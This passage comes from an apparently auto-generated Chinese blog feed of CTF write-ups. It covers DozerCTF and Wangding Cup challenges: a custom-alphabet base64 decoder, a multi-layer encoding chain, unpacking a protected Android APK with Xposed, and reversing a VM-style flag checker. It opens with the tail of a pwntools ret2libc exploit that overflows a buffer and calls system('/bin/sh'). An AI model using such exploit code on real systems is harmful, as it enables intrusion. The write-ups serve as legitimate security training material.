class="string">&#x27;/bin/sh&#x27;</span>).<span class="built_in">next</span>()</span><br><span class="line">log.info(<span class="string">&quot;binsh:&quot;</span>+<span class="built_in">hex</span>(binsh))</span><br><span class="line"></span><br><span class="line"><span class="comment">#onegadget = 0x3ac5c + libc_base</span></span><br><span class="line"><span class="comment">#log.info(&quot;onegadget:&quot;+hex(onegadget))</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">0x6c</span>+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"><span class="comment">#payload += p32(0x08048362) + p32(onegadget)</span></span><br><span class="line">payload += p32(system) + p32(<span class="number">0xdeadbeef</span>) + p32(binsh)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;!\n&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="RE-貌似有些不对"><a href="#RE-貌似有些不对" class="headerlink" title="RE - 貌似有些不对"></a>RE - 貌似有些不对</h2><p>上面字符串 base 加密，下面自定义 自定义密码表 ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200614215140.png"></p><p>解密脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># @Author  : MrSkYe</span></span><br><span class="line"><span class="comment"># @Email   : skye231@foxmail.com</span></span><br><span class="line"><span class="comment"># @File    : base_diy.py</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 自定义加密表</span></span><br><span class="line"><span class="comment">#s = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;#原版</span></span><br><span class="line">s = <span class="string">&quot;ZYXABCDEFGHIJKLMNOPQRSTUVWzyxabcdefghijklmnopqrstuvw0123456789+/&quot;</span><span class="comment">#自定义</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_encode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(<span class="built_in">ord</span>(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;8&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment"># 不够三倍数，需补齐的次数</span></span><br><span class="line">nums = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line"><span class="comment">#每次取三个字符的二进制</span></span><br><span class="line">temp_list = bin_str[:<span class="number">3</span>]</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_list) != <span class="number">3</span>):</span><br><span class="line">nums = <span class="number">3</span> - <span class="built_in">len</span>(temp_list)</span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(temp_list) &lt; <span class="number">3</span>:</span><br><span class="line">temp_list += [<span class="string">&#x27;0&#x27;</span> * <span class="number">8</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 将三个8字节的二进制转换为4个十进制</span></span><br><span class="line">temp_str_list = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">4</span>):</span><br><span class="line">temp_str_list.append(<span class="built_in">int</span>(temp_str[i*<span class="number">6</span>:(i+<span class="number">1</span>)*<span class="number">6</span>],<span class="number">2</span>))</span><br><span class="line"><span class="comment">#print(temp_str_list)</span></span><br><span class="line"><span class="keyword">if</span> nums:</span><br><span class="line">temp_str_list = temp_str_list[<span class="number">0</span>:<span class="number">4</span> - nums]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> temp_str_list:</span><br><span class="line">outputs += s[i]</span><br><span class="line">bin_str = bin_str[<span class="number">3</span>:]</span><br><span class="line">outputs += nums * <span class="string">&#x27;=&#x27;</span></span><br><span class="line">print(<span class="string">&quot;Encrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">My_base64_decode</span>(<span class="params">inputs</span>):</span></span><br><span class="line"><span class="comment"># 将字符串转化为2进制</span></span><br><span class="line">bin_str = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> inputs:</span><br><span class="line"><span class="keyword">if</span> i != <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">x = <span class="built_in">str</span>(<span class="built_in">bin</span>(s.index(i))).replace(<span class="string">&#x27;0b&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">bin_str.append(<span class="string">&#x27;&#123;:0&gt;6&#125;&#x27;</span>.<span class="built_in">format</span>(x))</span><br><span class="line"><span class="comment">#print(bin_str)</span></span><br><span class="line"><span class="comment"># 输出的字符串</span></span><br><span class="line">outputs = <span class="string">&quot;&quot;</span></span><br><span class="line">nums = inputs.count(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> bin_str:</span><br><span class="line">temp_list = bin_str[:<span class="number">4</span>]</span><br><span class="line">temp_str = <span class="string">&quot;&quot;</span>.join(temp_list)</span><br><span class="line"><span class="comment">#print(temp_str)</span></span><br><span class="line"><span class="comment"># 补足8位字节</span></span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(temp_str) % <span class="number">8</span> != <span class="number">0</span>):</span><br><span class="line">temp_str = temp_str[<span class="number">0</span>:-<span class="number">1</span> * nums * <span class="number">2</span>]</span><br><span class="line"><span class="comment"># 将四个6字节的二进制转换为三个字符</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">int</span>(<span class="built_in">len</span>(temp_str) / <span class="number">8</span>)):</span><br><span class="line">outputs += <span class="built_in">chr</span>(<span class="built_in">int</span>(temp_str[i*<span class="number">8</span>:(i+<span class="number">1</span>)*<span class="number">8</span>],<span class="number">2</span>))</span><br><span class="line">bin_str = bin_str[<span class="number">4</span>:]</span><br><span class="line">print(<span class="string">&quot;Decrypted String:\n%s &quot;</span>%outputs)</span><br><span class="line"></span><br><span class="line">print()</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *    (1)encode         (2)decode    *&quot;</span>)</span><br><span class="line">print(<span class="string">&quot;     *************************************&quot;</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">num = <span class="built_in">input</span>(<span class="string">&quot;Please select the operation you want to perform:\n&quot;</span>)</span><br><span class="line"><span class="keyword">if</span>(num == <span class="string">&quot;1&quot;</span>):</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be encrypted: \n&quot;</span>)</span><br><span class="line">My_base64_encode(input_str)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">input_str = <span class="built_in">input</span>(<span class="string">&quot;Please enter a string that needs to be decrypted: \n&quot;</span>)</span><br><span class="line">My_base64_decode(input_str)</span><br></pre></td></tr></table></figure><h2 id="Crypto-真·签到"><a href="#Crypto-真·签到" class="headerlink" title="Crypto - 真·签到"></a>Crypto - 真·签到</h2><p>给的一个程序，运行不起来，IDA 打开就很奇怪，然后随手往记事本一带，发现一串字符串。看这样子像是 base 64 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">R00yVE1NWlRIRTJFRU5CWUdVM1RNUlJURzRaVEtOUllHNFpUTU9CV0lJM0RRTlJXRzQ0VE9OSlhHWTJET05aUkc1QVRPTUJUR0kyRUVNWlZHNDNUS05aWEc0MlRHTkpaR1pBVElNUldHNDNUT05KVUc0M0RPTUJXR0kyRUtOU0ZHTTRUT09CVUc0M0VFPT09Cgo&#x3D;</span><br></pre></td></tr></table></figure><p>加密之后长这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GM2TMMZTHE2EENBYGU3TMRRTG4ZTKNRYG4ZTMOBWII3DQNRWG44TONJXGY2DONZRG5ATOMBTGI2EEMZVG43TKNZXG42TGNJZGZATIMRWG43TONJUG43DOMBWGI2EKNSFGM4TOOBUG43EE&#x3D;&#x3D;&#x3D;</span><br></pre></td></tr></table></figure><p>然后联想 base 32 的占位符（也就是 = ）的可能是 6、4、3、1 个，又顺手解密后：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3563394B48576F37356873686B686679757647717A70324B3577577753596A426777547670624E6E3978476B</span><br></pre></td></tr></table></figure><p>然后就是 16 进制转换字符串：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5c9KHWo75hshkhfyuvGqzp2K5wWwSYjBgwTvpbNn9xGk</span><br></pre></td></tr></table></figure><p>然后再转一个 base 58 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Dozerctf&#123;base_family_is_so_good&#125;</span><br></pre></td></tr></table></figure><p>其实这种多重加密，用 CyberChef 能自动解出来一部分，这题的最后两步就是自动解出来的：</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/skyedai910/Picbed/img/20200613155002.png"></p><p>点击下面链接可以查看整个解密流程：<br><code>https://skyedai910.github.io/CyberChef/#recipe=From_Base64(&#39;A-Za-z0-9%2B/%3D&#39;,true)From_Base32(&#39;A-Z2-7%3D&#39;,true)From_Hex(&#39;None&#39;)From_Base58(&#39;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&#39;,false)&amp;input=UjAweVZFMU5XbFJJUlRKRlJVNUNXVWRWTTFSTlVsSlVSelJhVkV0T1VsbEhORnBVVFU5Q1YwbEpNMFJSVGxKWFJ6UTBWRTlPU2xoSFdUSkVUMDVhVWtjMVFWUlBUVUpVUjBreVJVVk5XbFpITkROVVMwNWFXRWMwTWxSSFRrcGFSMXBCVkVsTlVsZEhORE5VVDA1S1ZVYzBNMFJQVFVKWFIwa3lSVXRPVTBaSFRUUlVUMDlDVlVjME0wVkZQVDA5Q2dvPQ</code></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> DozerCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第二届网鼎杯青龙组部分题目Writeup</title>
      <link href="archives/973b495c/"/>
      <url>archives/973b495c/</url>
      
        <content type="html"><![CDATA[<h2 id="Reverse-bang"><a href="#Reverse-bang" class="headerlink" title="Reverse bang"></a>Reverse bang</h2><p><strong>考点：梆梆加固脱壳</strong></p><h3 id="加固特征分析"><a href="#加固特征分析" class="headerlink" title="加固特征分析"></a>加固特征分析</h3><p>apktools 加载工程后，部分文件丢失（灰色）。smail 代码只有 SecShell 类；lib 中发现 libSecShell.so ，结合<a href="https://blog.csdn.net/g5703129/article/details/85054405">最新各大apk加固特征库</a>和吾爱帖子推测应该是<strong>梆梆加固免费版</strong>。</p><p>梆梆加固会隐藏源码，然后在 com 中加载 libSecShell.so ，来运行程序。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;SecShell&quot;</span>);</span><br></pre></td></tr></table></figure><h3 id="程序脱壳"><a href="#程序脱壳" class="headerlink" title="程序脱壳"></a>程序脱壳</h3><blockquote><p> 脱壳过程一直踩坑，各种环境问题而出错。</p><p>准备使用<a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a>来脱壳的，但是 AS ADV arm架构机器一直报错运行不起来。<a href="https://www.mrskye.cn/archives/123/">失败记录独立成篇</a>，跪求大佬指导。</p></blockquote><p>选择使用 xposed + <a href="https://github.com/OakChen/ApkShelling">apkshelling</a> 模块脱壳，脱壳原理移步作者 github 。</p><h4 id="编译apkshelling"><a href="#编译apkshelling" class="headerlink" title="编译apkshelling"></a>编译apkshelling</h4><p>apkshelling 会匹配是否目标包名及是否加壳，是的话就脱壳。但稳妥起见将目标 apk 的包名填入到 apkshelling 源码中的 XposedEntry 。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-yeJ92tvgzwmWc418.png"></p><p>编译生成 apk ，安装到虚拟器中，在 xpoesed 中激活启用，重启虚拟机。</p><p>apk 源码中有 activity 需要编译成无桌面图标的。如果要编译无桌面图标 apk 看这里：</p><p>[collapse title=”展开查看详情” status=”false”]</p><p>launch 选择 Nothing。</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-SIncXxjJrmM0do4M.png"></p><p>或者需注释掉xml 里面的 APP 入口Activity中的下面这句即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">&quot;android.intent.category.LAUNCHER&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure><p>[/collapse]</p><h4 id="dump-dex"><a href="#dump-dex" class="headerlink" title="dump dex"></a>dump dex</h4><p>重启后安装&amp;运行题目的 apk。查看 xpoesed 日志看看有没有 dump 到dex ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb logcat -s Xposed</span><br></pre></td></tr></table></figure><p>成功 dump 会有类似 log ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">I/Xposed  ( 2450): Load package: com.example.how_debug</span><br><span class="line">I/Xposed  ( 2450): Found com.SecShell.SecShell.ApplicationWrapper</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-01.dex</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-02.dex</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-03.dex</span><br><span class="line">I/Xposed  ( 2450): Thread: 81, File: /data/data/com.example.how_debug/00081-04.dex</span><br></pre></td></tr></table></figure><p>dex 会被 dump 到<code>/data/data/包名</code>。</p><h4 id="逆向找flag"><a href="#逆向找flag" class="headerlink" title="逆向找flag"></a><del>逆向</del>找flag</h4><p>把 dex 拖到本机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb pull /data/data/com.example.how_debug/00081-02.dex ./</span><br></pre></td></tr></table></figure><p>dump 出来的 dex 文件，使用 jeb 打开，也可以选择 jadx 。</p><p>dump 出来的 4 个 dex 只有一个是程序源码，挨个找一下（com.example.how_debug）就行。</p><p>打开后就能找到 flag ：</p><p><img src= "/img/loading.gif" data-lazy-src="https://mrskye.cn-gd.ufileos.com/img/2020-05-12-zWUkxSjcY9WSMDqi.png"></p><h3 id="碎碎念"><a href="#碎碎念" class="headerlink" title="碎碎念"></a>碎碎念</h3><p>搜罗一下发现 <a href="https://github.com/hanbinglengyue/FART">FART</a> 好像也可以脱这个壳，但相比于 <a href="https://github.com/OakChen/ApkShelling">apkshelling</a> 能力比较弱，具体对比&amp;安装&amp;使用，看这里：<a href="https://www.jianshu.com/p/ed64212ccd38">ApkShelling脱壳和FART脱壳</a>。</p><p>实在太菜 <a href="https://github.com/lambdalang/DexExtractor">DexExtractor</a> 环境部署不来。</p><h2 id="Reverse-signal"><a href="#Reverse-signal" class="headerlink" title="Reverse signal"></a>Reverse signal</h2><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>程序要求输入一串字符，前面有一个校验长度是否为 15 。检验通过后会进入下面这个伪虚拟机的加密函数里面。操作的指令存放在 a1 ，加密的 flag 也在 a1 。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">vm_operad</span><span class="params">(<span class="keyword">int</span> *a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> v3[<span class="number">100</span>]; <span class="comment">// [esp+13h] [ebp-E5h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">100</span>]; <span class="comment">// [esp+77h] [ebp-81h]</span></span><br><span class="line">  <span class="keyword">char</span> v5; <span class="comment">// [esp+DBh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> v6; <span class="comment">// [esp+DCh] [ebp-1Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v7; <span class="comment">// [esp+E0h] [ebp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [esp+E4h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> v9; <span class="comment">// [esp+E8h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> v10; <span class="comment">// [esp+ECh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v10 = <span class="number">0</span>;</span><br><span class="line">  v9 = <span class="number">0</span>;</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = v10;</span><br><span class="line">    <span class="keyword">if</span> ( v10 &gt;= a2 )</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    <span class="keyword">switch</span> ( a1[v10] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        v4[v7] = v5;</span><br><span class="line">        ++v10;</span><br><span class="line">        ++v7;</span><br><span class="line">        ++v9;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        v5 = a1[v10 + <span class="number">1</span>] + v3[v9];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        v5 = v3[v9] - LOBYTE(a1[v10 + <span class="number">1</span>]);</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        v5 = a1[v10 + <span class="number">1</span>] ^ v3[v9];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        v5 = a1[v10 + <span class="number">1</span>] * v3[v9];</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">        <span class="keyword">if</span> ( v4[v8] != a1[v10 + <span class="number">1</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;what a shame...&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        ++v8;</span><br><span class="line">        v10 += <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">        v3[v6] = v5;</span><br><span class="line">        ++v10;</span><br><span class="line">        ++v6;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">        read(v3);</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">        v5 = v3[v9] - <span class="number">1</span>;</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">        v5 = v3[v9] + <span class="number">1</span>;</span><br><span class="line">        ++v10;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行的指令如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 读入明文</span></span><br><span class="line">10</span><br><span class="line"><span class="meta">#</span><span class="bash"> 加密开始</span></span><br><span class="line">4, 8, 3, 1, </span><br><span class="line">4, 8, 5, 1, </span><br><span class="line">3, 8, 11, 1,</span><br><span class="line">12, 8, 4, 1,</span><br><span class="line">5, 8, 3, 1,</span><br><span class="line">11, 8, 11, 1,</span><br><span class="line">4, 8, 3, 1,</span><br><span class="line">2, 8, 4, 1,</span><br><span class="line">12, 8, 11, 1,</span><br><span class="line">5, 8, 2, 1,</span><br><span class="line">2, 8, 4, 1,</span><br><span class="line">2, 8, 5, 1,</span><br><span class="line">5, 8, 2, 1, </span><br><span class="line">4, 8, 3, 1,</span><br><span class="line">2, 8, 12, 1,</span><br><span class="line"><span class="meta">#</span><span class="bash"> 校验 15 位密文</span></span><br><span class="line">7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7, 7</span><br></pre></td></tr></table></figure><p>1 是将明文加密后的字符赋值到 v4 ，用于最后校验密文。</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>每个字符加密操作，没有用到迭代的中间变量，所以 a1 中的密文提取出来，然后按照各个字符逐个解密：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">m1&#x3D;(c[0]+5)^0x10</span><br><span class="line">m2&#x3D;(c[1]&#x2F;3)^0x20</span><br><span class="line">m3&#x3D;c[2]+3</span><br><span class="line">m4&#x3D;(c[3]^4)-1</span><br><span class="line">m5&#x3D;(c[4]+0x21)&#x2F;3</span><br><span class="line">m6&#x3D;(c[5]+2)</span><br><span class="line">m7&#x3D;(c[6]+0x20)^9</span><br><span class="line">m8&#x3D;((c[7]^0x24)-0x51)&amp;0xff</span><br><span class="line">m9&#x3D;c[8]</span><br><span class="line">m10&#x3D;((c[9]&amp;0xff)-0x25)&#x2F;2</span><br><span class="line">m11&#x3D;((c[10]^0x41)-0x36)</span><br><span class="line">m12&#x3D;(c[11]-0x20)</span><br><span class="line">m13&#x3D;(c[12]-0x25)&#x2F;3</span><br><span class="line">m14&#x3D;(c[13]+0x20)^9</span><br><span class="line">m15&#x3D;c[14]-0x42</span><br></pre></td></tr></table></figure><p>最后结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">757515121f3d478</span><br></pre></td></tr></table></figure><p>事后发觉如果每个字符都是单独加密的，没有迭代的。可以试试把每一个密码的所有明文对应的密文爆破出来，然后就只需要挑出来对应的明文即可。ascii 可见字符应该是 95 个，每一轮的输入 15 个相同 明文，然后提取加密的字符串，可以实现的。</p><p>听群里老师傅能用 <code>angr</code> 秒。</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> 网鼎杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020第二届网鼎杯RE-bang脱壳环境踩坑记录</title>
      <link href="archives/6065cbd4/"/>
      <url>archives/6065cbd4/</url>
      
